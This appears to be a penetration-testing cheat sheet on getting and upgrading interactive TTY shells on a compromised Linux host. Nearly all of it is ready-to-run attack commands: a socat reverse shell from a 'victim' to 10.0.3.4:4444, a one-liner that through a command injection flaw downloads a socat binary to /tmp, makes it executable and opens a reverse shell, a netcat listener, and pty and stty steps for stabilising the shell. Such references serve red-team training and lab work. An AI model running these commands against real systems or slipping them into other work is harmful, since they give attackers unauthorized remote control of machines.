# TTY Shells

### **Bash**

```bash
/bin/bash -i
echo os.system('/bin/bash')
/bin/sh -i
```

### **Python**

```python
python -c "import pty; pty.spawn('/bin/bash')"
```

### **Perl**

```perl
perl -e 'exec "/bin/bash";'
```

### Socat

**On Kali (listen)**:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**On Victim (launch)**:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

If <mark style="color:green;">`socat`</mark> <mark style="color:green;"></mark><mark style="color:green;"></mark> isn’t installed, there are standalone binaries that can be downloaded from this Github repo:

{% embed url="https://github.com/andrew-d/static-binaries" %}

With a command injection vuln, it’s possible to download the correct architecture <mark style="color:green;">`socat`</mark> <mark style="color:green;"></mark><mark style="color:green;"></mark> binary to a writable directory, chmod it, then execute a reverse shell in one line:

```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

### rlwrap

```bash
sudo apt install rlwrap
rlwrap -cAr nc -nvlp [PORT]
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Interactive TTY

```bash
# In reverse shell
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
stty raw -echo;fg

# In reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

## Resource

{% embed url="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys#method-2-using-socat" %}
